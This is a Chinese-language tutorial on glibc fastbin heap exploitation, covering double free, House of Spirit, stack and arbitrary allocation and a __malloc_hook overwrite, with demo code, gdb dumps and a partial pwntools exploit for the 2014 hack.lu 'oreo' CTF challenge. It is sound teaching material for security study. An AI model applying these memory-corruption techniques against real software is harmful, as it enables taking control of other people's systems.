# Fastbin Attack

## 介绍

fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：

- 存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞
- 漏洞发生于 fastbin 类型的 chunk 中

如果细分的话，可以做如下的分类：

- Fastbin Double Free
- House of Spirit
- Alloc to Stack
- Arbitrary Alloc

其中，前两种主要漏洞侧重于利用 `free` 函数释放**真的 chunk 或伪造的 chunk**，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 `fd` 指针，直接利用 `malloc` 申请指定位置 chunk 进行攻击。

## 原理 

fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。

```c
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    //进行释放
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
```

释放前

```
0x602000:   0x0000000000000000  0x0000000000000041 <=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 <=== chunk2
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 <=== chunk3
0x602090:   0x0000000000000000  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 <=== top chunk
```

执行三次 free 进行释放后

```
0x602000:   0x0000000000000000  0x0000000000000041 <=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 <=== chunk2
0x602050:   0x0000000000602000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 <=== chunk3
0x602090:   0x0000000000602040  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 <=== top chunk
```

此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表

```
Fastbins[idx=2, size=0x30,ptr=0x602080]
===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
```



## Fastbin Double Free

### 介绍 

Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。

Fastbin Double Free 能够成功利用主要有两部分的原因

1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。

```c
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
```

### 演示 

下面的示例程序说明了这一点，当我们试图执行以下代码时



```c
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
```

如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。

```
*** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
```

如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。

```c
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```

第一次释放`free(chunk1)`

![fastbin_free_chunk1](img\fastbin_free_chunk1.png)

第二次释放`free(chunk2)`

![fastbin_free_chunk2](img\fastbin_free_chunk2.png)

第三次释放`free(chunk1)`

![fastbin_free_chunk3](img\fastbin_free_chunk3.png)

注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=>chunk1=>chun2=>chunk1 的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。

```c
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("%p",chunk_b);
    return 0;
}
```

在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于 bss 段中正是我们之前设置的`CHUNK bss_chunk`

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 <bss_chunk>:   0x0000000000000000  0x0000000000000021
0x601090 <bss_chunk+16>:0x0000000000000000  0x0000000000000000
0x6010a0:               0x0000000000000000  0x0000000000000000
0x6010b0:               0x0000000000000000  0x0000000000000000
0x6010c0:               0x0000000000000000  0x0000000000000000
```

值得注意的是，我们在 main 函数的第一步就进行了`bss_chunk.size=0x21;`的操作，这是因为_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。

```
*** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
```

_int_malloc 中的校验如下

```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = "malloc(): memory corruption (fast)";
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
```



### 小总结 

通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。

## House Of Spirit

> [【技术分享】堆之House of Spirit](https://www.anquanke.com/post/id/85357)
>
> [PWN学习之house of系列(一)](https://paper.seebug.org/521/)

### 介绍 

House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。

该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配**指定地址**的 chunk 的目的。

要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即

- fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

至于为什么要绕过这些检测，可以参考 free 部分的源码。

### 演示 

这里就直接以 how2heap 上的例子进行说明，如下

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

运行后的效果如下

```shell
➜  how2heap git:(master) ./house_of_spirit
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
malloc(0x30): 0x7ffd9bceaa60
```

### 小总结 

可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，**关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测**。

## Alloc to Stack

### 介绍 

如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。

该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。

### 演示 

这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。

```
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```

通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk

```
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
0x602010:   0x00007fffffffde60  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 <=== top chunk
```

之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行

```
0x7ffff7dd1b20 <main_arena>:    0x0000000000000000 <=== unsorted bin
0x7ffff7dd1b28 <main_arena+8>:  0x00007fffffffde60 <=== fastbin[0]
0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000
```

最终第二次 malloc 返回值为 0x00007fffffffde70 也就是 stack_chunk

```
   0x400629 <main+83>        call   0x4004c0 <malloc@plt>
 → 0x40062e <main+88>        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```



### 小总结 

通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。

## Arbitrary Alloc

### 介绍 

Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。

### 演示 

在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。**

```
int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
```

这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。

```
0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b10 <__malloc_hook>: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
```

0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：

```
//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
```

通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f

```
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0

0x7ffff7dd1af5 <_IO_wide_data_0+309>:   0x000000000000007f
```

因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。





```
##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```

（注意 sz 的大小是 unsigned int，因此只占 4 个字节）



而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。

```
0x4005a8 <main+66>        call   0x400450 <malloc@plt>
 →   0x4005ad <main+71>        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x7ffff7dd1afd

0x7ffff7dd1aed <_IO_wide_data_0+301>:   0xfff7dd0260000000  0x000000000000007f
0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:  0x000000000000007f  0x0000000000000000
0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000
```

### 小总结 

Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。

## 2014 hack.lu oreo

### 基本情况

程序比较古老，32 位的堆题

    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
### 基本功能

存储枪支信息结构体：

```c
struct rifle {
	description //从0字节开始
	name //从25字节开始
	pre_rifle_ptr //从52字节开始
} //总共56字节
```

- 添加枪支，会读取枪支的名字与描述。读取的名字的长度为 56 ，可以覆盖后面堆块的数据。需要注意的是，枪支信息堆块大小固定为 0x40 （含chunk_header）。

- 展示添加枪支，即从头到尾输出枪支的描述与名字。

- ~~订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为 NULL。~~将最后添加的枪支释放，然后在释放当前堆最后 4 字节指向的内存地址，如果为 0 则结束释放。

    ```
    pwndbg> x /20wx 0x0804b858-0x8
    0x804b850:	0x00000000	0x00000041	0x64646464	0x64646464
    0x804b860:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804b870:	0x63636300	0x63636363	0x00000063	0x00000000
    0x804b880:	0x00000000	0x00000000	0x00000000	0x0804b818<--指向下一个堆
    0x804b890:	0x00000000	0x00020771	0x00000000	0x00000000
    ```

- 留下订货消息

- 展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。

### 漏洞

create 的时候 name 和 description 都存在溢出的情况，两者可输入长度都是 56 字节。修改两者都是可以修改 chunk 指向的下一个 chunk 地址，也就是最后 4 字节，修改 desc 时还可以溢出修改下一个堆信息。

### 思路

没有打开 PIE ，一开始想着 double free 然后改 got 表地址泄露 getshell 一条龙。但是有个大问题，chunk_ptr 只保存最后申请 chunk 的指针信息，换句话说就是申请一个新的 chunk ，旧指针就会被覆盖了，指针丢失了，无法完成 double free 。

最终使用 house of spirit getshell 。

1. 申请一个 chunk ，通过溢出将某个函数 got 表地址写入最后 4 个字节，用输出功能泄露 libc 地址。

2. 申请 0x40 个 chunk ，用于后续伪造 fastbin 绕过 size check 检查。

3. 溢出修改 chunk 最后 4 字节的下一个 chunk 指针，指向 0x0804A2A8 notice_ptr ，这个是作为 fake chunk 的 fd 位。

4. 布置 0x0804A2A8 后面的 chunk 信息绕过检查，前面的绕过伪造已经在第一步完成。

5. 提交信息（free all chunk），fastbin 就会得到这样的一组指针：

    ```
    0x40: 0x0804A2A0->some where heap->NULL
    ```

    到这里就得到一组任意写指针了。

---

申请 0x40 个 chunk 会记录在 chunk_num ，如果以 0x0804A2A8 为 fake chunk 的 fd 指针，那么 chunk_num 刚刚好就是 fake_chunk size 位：

```
pwndbg> x /20wx 0x0804A2A0
0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000
0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000
```

申请第 0x40 的时候溢出修改最后 4 字节的下一 chunk 地址为 0x0804A2A8 。bypass fastbin size check 。

然后利用写入 notice 信息，布置 fake_chunk 后一个 chunk 信息，bypass 相关保护，完成 house  of spirit 布置。

写入内容就是就是：从 0x0804A2A8 + 0x30 开始写入下一个 chunk header 信息即可（prev_size = 0x40 , size = 0x100 ）。

当 free all chunk 时 fake chunk 就会通过检查，成功放入到 bin 中：

```
0x40: 0x0804A2A0->some where heap->NULL
```

再次申请 chunk ，并写入函数地址，之后通过写入 notice 修改函数。

### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level='debug',os='linux',arch='i386')
context.binary = "./oreo"
oreo = ELF("./oreo")
p = process("./oreo")
libc = ELF('./libc.so.6')


def add(descrip, name):
    p.sendline('1')
    #p.recvuntil('Rifle name: ')
    p.sendline(name)
    #p.recvuntil('Rifle description: ')
    #sleep(0.5)
    p.sendline(descrip)


def show_rifle():
    p.sendline('2')
    p.recvuntil('===================================\n')


def order():
    p.sendline('3')


def message(notice):
    p.sendline('4')
    #p.recvuntil("Enter any notice you'd like to submit with your order: ")
    p.sendline(notice)


def exp():
    print 'step 1. leak libc base'
